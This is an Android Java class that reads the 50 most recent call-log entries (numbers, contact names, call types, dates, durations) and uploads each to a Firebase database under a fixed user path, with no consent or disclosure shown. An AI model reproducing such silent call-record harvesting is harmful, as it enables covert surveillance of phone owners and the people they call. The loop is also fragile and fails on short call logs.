package com.hazyaz.temps.CallLogs;

import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;

import com.google.firebase.FirebaseApp;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.Date;

public class GetCallLogs {
    public String getCallDetails(Context context) {
        int i=1;

        StringBuffer stringBuffer = new StringBuffer();

        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC");
        int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
        int name=cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
        while (i<=50) {
            cursor.moveToNext();
            String phNumber = cursor.getString(number);
            String callType = cursor.getString(type);
            String callDate = cursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = cursor.getString(duration);
            String cname=cursor.getString(name);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            stringBuffer.append("\n Name:---"+cname+"\nPhone Number:--- " + phNumber + " \nCall Type:--- "
                    + dir + " \nCall Date:--- " + callDayTime
                    + " \nCall duration in sec :--- " + callDuration);
            stringBuffer.append("\n----------------------------------");
            FirebaseApp.initializeApp(context);
//            callDayTime.setMonth(callDayTime.getMonth()+1);
//            callDayTime.setYear(callDayTime.getYear()+1900);
            CallLogs callLogs=new CallLogs(phNumber,dir,Integer.parseInt(callDuration),cname,callDayTime.getTime());
            DatabaseReference mDatabase = FirebaseDatabase.getInstance().getReference();

            mDatabase.child("users").child("username").child("CallLog").child(Integer.toString(i)).setValue(callLogs);
            i++;
        }
        cursor.close();
        return stringBuffer.toString();

    }
}
